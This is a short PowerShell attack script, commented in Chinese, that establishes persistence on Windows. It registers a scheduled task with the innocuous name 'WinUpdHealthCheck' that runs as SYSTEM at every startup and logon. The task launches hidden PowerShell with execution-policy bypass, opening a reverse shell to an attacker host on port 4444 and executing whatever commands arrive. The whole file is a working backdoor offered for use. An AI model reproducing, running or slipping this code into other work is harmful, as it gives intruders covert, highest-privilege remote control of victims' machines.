# persist_task.ps1 —— 计划任务持久化（SYSTEM 开机反向 shell）
param([string]$LHOST='192.168.2.20',[int]$LPORT=4444,[string]$TaskName='WinUpdHealthCheck')
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators')) { Write-Host '[!] need admin'; exit 1 }
$inner = "`$c=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);`$s=`$c.GetStream();`$b=New-Object byte[] 65536;`$e=New-Object Text.ASCIIEncoding;while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){`$d=`$e.GetString(`$b,0,`$i).Trim();if(`$d -eq 'exit'){break};try{`$r=(iex `$d 2>1|Out-String)}catch{`$r=`$_.Exception.Message};`$o=`$r+'PS> ';`$sb=`$e.GetBytes(`$o);`$s.Write(`$sb,0,`$sb.Length);`$s.Flush()};`$c.Close()"
$act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-nop -w hidden -ep bypass -c "{0}"' -f ($inner -replace '"','\"'))
$trg = @((New-ScheduledTaskTrigger -AtStartup), (New-ScheduledTaskTrigger -AtLogOn))
$prn = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
$set = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero)
Register-ScheduledTask -TaskName $TaskName -Action $act -Trigger $trg -Principal $prn -Settings $set -Force | Out-Null
Write-Host "[+] task '$TaskName' registered -> $LHOST`:$LPORT as SYSTEM (startup + logon)"
Write-Host "[i] also adds: schtasks /delete /tn $TaskName /f   # to remove"
